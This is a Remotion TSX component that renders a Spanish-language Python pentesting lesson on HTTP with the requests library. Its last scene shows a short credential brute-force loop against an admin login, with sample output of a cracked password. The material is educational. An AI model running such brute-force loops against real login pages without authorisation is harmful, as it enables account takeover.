// ── video/remotion/compositions/Py05HttpRequests.tsx ─────────────
// Video: pentesting II — HTTP con requests.
// Clase 5 de Scripting/Python (lección python-05). Guiones: voicebox-scripts/py-05-*.txt
// Audios reales en public/videos/audio/py-05-http-requests/ (ffprobe 2026-08-26).

import React from 'react';
import { AbsoluteFill, Sequence, staticFile, useVideoConfig } from 'remotion';
import { Audio } from '@remotion/media';
import { sceneStartFrames, AUDIO_TIMINGS, hasAudio } from '../audioTimings';
import { THEME, MONO } from '../theme';
import { FontFace } from '../fonts';
import { RevealLine } from '../primitives/RevealLine';
import { KeyCapsule } from '../primitives/KeyCapsule';
import { TerminalWindow } from '../primitives/TerminalWindow';

const CENTERED: React.CSSProperties = {
  display: 'flex',
  flexDirection: 'column',
  justifyContent: 'center',
  alignItems: 'center',
  height: '100%',
  textAlign: 'center',
};

// ── Escena 1: la web, blanco número uno ──────────────────────────
const Scene1: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 32, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 18 }}>
      HTTP CON <span style={{ color: THEME.red }}>REQUESTS</span>
    </div>
    <div style={{ fontSize: 18, color: THEME.muted, fontFamily: MONO, marginBottom: 28 }}>
      La web es el blanco número uno: automatizá tus ataques
    </div>
    <KeyCapsule label="automatización web" value="logins, rutas y payloads" accent={THEME.cyan} delay={Math.round(2.5 * fps)} size={24} />
    <div style={{ marginTop: 24, fontSize: 17, color: THEME.muted, fontFamily: MONO, textAlign: 'left', width: 780 }}>
      <RevealLine at={5} fps={fps} mark="▸" color={THEME.cyan}>Probar credenciales, fuzzing de directorios y APIs</RevealLine>
      <div style={{ height: 10 }} />
      <RevealLine at={9} fps={fps} mark="▸" color={THEME.green}>Combina bucles, condiciones y peticiones HTTP en un solo script</RevealLine>
    </div>
  </AbsoluteFill>
);

// ── Escena 2: requests en tres líneas ────────────────────────────
const Scene2: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 16 }}>
      HTTP EN <span style={{ color: THEME.green }}>TRES LÍNEAS</span>
    </div>
    <TerminalWindow title="kali@attacker-01:~$ python3 -i http_test.py" width={940} delay={Math.round(1.5 * fps)}>
      <div style={{ fontSize: 13, whiteSpace: 'pre', lineHeight: 1.65 }}>
        <span style={{ color: THEME.cyan }}>import</span><span style={{ color: THEME.text }}> requests</span>
        {'\n'}<span style={{ color: THEME.text }}>r = requests.get(</span><span style={{ color: THEME.green }}>"http://10.0.0.11"</span><span style={{ color: THEME.text }}>) </span><span style={{ color: THEME.dim }}># Envía GET y guarda respuesta</span>
        {'\n'}<span style={{ color: THEME.cyan }}>r.status_code</span><span style={{ color: THEME.dim }}>        # 200 (código HTTP)</span>
        {'\n'}<span style={{ color: THEME.cyan }}>r.headers["Server"]</span><span style={{ color: THEME.dim }}>  # Apache/2.4.41 (cabeceras)</span>
        {'\n'}<span style={{ color: THEME.cyan }}>r.text</span><span style={{ color: THEME.dim }}>               # el cuerpo HTML de la página</span>
        {'\n'}<span style={{ color: THEME.dim }}># requests.post(url, data={'{...}'}) envía formularios</span>
        {'\n'}<span style={{ color: THEME.dim }}># s = requests.Session() mantiene cookies entre peticiones</span>
      </div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 12, marginTop: 18 }}>
      <KeyCapsule label="r.status_code / r.text" value="código y cuerpo" accent={THEME.cyan} delay={Math.round(6 * fps)} size={16} />
      <KeyCapsule label="requests.post" value="envía datos/login" accent={THEME.green} delay={Math.round(10 * fps)} size={16} />
      <KeyCapsule label="requests.Session()" value="persiste cookies" accent={THEME.amber} delay={Math.round(14 * fps)} size={16} />
    </div>
  </AbsoluteFill>
);

// ── Escena 3: brute force de login y fuzzing ─────────────────────
const Scene3: React.FC<{ fps: number }> = ({ fps }) => (
  <AbsoluteFill style={CENTERED}>
    <div style={{ fontSize: 26, fontWeight: 800, color: THEME.text, fontFamily: MONO, marginBottom: 16 }}>
      FUERZA BRUTA: <span style={{ color: THEME.cyan }}>DECIDIR POR LA RESPUESTA</span>
    </div>
    <TerminalWindow title="kali@attacker-01:~$ python3 brute.py" width={940} delay={Math.round(1.5 * fps)}>
      <div style={{ fontSize: 13, whiteSpace: 'pre', lineHeight: 1.65 }}>
        <span style={{ color: THEME.cyan }}>for</span><span style={{ color: THEME.text }}> pwd </span><span style={{ color: THEME.cyan }}>in</span><span style={{ color: THEME.text }}> [</span><span style={{ color: THEME.green }}>"123456"</span><span style={{ color: THEME.text }}>, </span><span style={{ color: THEME.green }}>"admin"</span><span style={{ color: THEME.text }}>, </span><span style={{ color: THEME.green }}>"toor"</span><span style={{ color: THEME.text }}>, </span><span style={{ color: THEME.green }}>"secret"</span><span style={{ color: THEME.text }}>]:</span>
        {'\n'}<span style={{ color: THEME.text }}>    r = requests.post(url, data={'{'}"user": "admin", "pass": pwd{'}'})</span>
        {'\n'}<span style={{ color: THEME.cyan }}>    if </span><span style={{ color: THEME.green }}>"bienvenido" </span><span style={{ color: THEME.cyan }}>in </span><span style={{ color: THEME.text }}>r.text.lower() </span><span style={{ color: THEME.cyan }}>or </span><span style={{ color: THEME.text }}>r.status_code == </span><span style={{ color: THEME.amber }}>302</span><span style={{ color: THEME.cyan }}>:</span>
        {'\n'}<span style={{ color: THEME.text }}>        print(f"[+] Credencial válida: admin:{'{'}pwd{'}'}")</span>
        {'\n'}<span style={{ color: THEME.cyan }}>        break</span>
        {'\n'}<span style={{ color: THEME.dim }}>{`[-] admin:123456 -> Falló  [-] admin:admin -> Falló`}</span>
        {'\n'}<span style={{ color: THEME.green }}>[+] Credencial válida: admin:toor</span>
      </div>
    </TerminalWindow>
    <div style={{ display: 'flex', gap: 12, marginTop: 18 }}>
      <KeyCapsule label='"bienvenido" in r.text' value="detectar éxito" accent={THEME.green} delay={Math.round(4 * fps)} size={16} />
      <KeyCapsule label="status_code == 302" value="detectar redirect" accent={THEME.cyan} delay={Math.round(8 * fps)} size={16} />
      <KeyCapsule label="wordlist real" value="brute-forcer / fuzzer" accent={THEME.red} delay={Math.round(13 * fps)} size={16} />
    </div>
  </AbsoluteFill>
);

export const Py05HttpRequests: React.FC = () => {
  const { fps } = useVideoConfig();
  const [s1, s2, s3] = AUDIO_TIMINGS['py-05-http-requests'];
  const starts = sceneStartFrames('py-05-http-requests', fps);
  const dur1 = Math.ceil(s1 * fps);
  const dur2 = Math.ceil(s2 * fps);
  const dur3 = Math.ceil(s3 * fps) + fps;
  const withAudio = hasAudio('py-05-http-requests');

  return (
    <AbsoluteFill style={{ background: THEME.bg, padding: 60, fontFamily: MONO }}>
      <FontFace />
      <Sequence from={starts[0]} durationInFrames={dur1}>
        {withAudio && <Audio src={staticFile('videos/audio/py-05-http-requests/py-05-scene1.wav')} />}
        <Scene1 fps={fps} />
      </Sequence>
      <Sequence from={starts[1]} durationInFrames={dur2}>
        {withAudio && <Audio src={staticFile('videos/audio/py-05-http-requests/py-05-scene2.wav')} />}
        <Scene2 fps={fps} />
      </Sequence>
      <Sequence from={starts[2]} durationInFrames={dur3}>
        {withAudio && <Audio src={staticFile('videos/audio/py-05-http-requests/py-05-scene3.wav')} />}
        <Scene3 fps={fps} />
      </Sequence>
    </AbsoluteFill>
  );
};
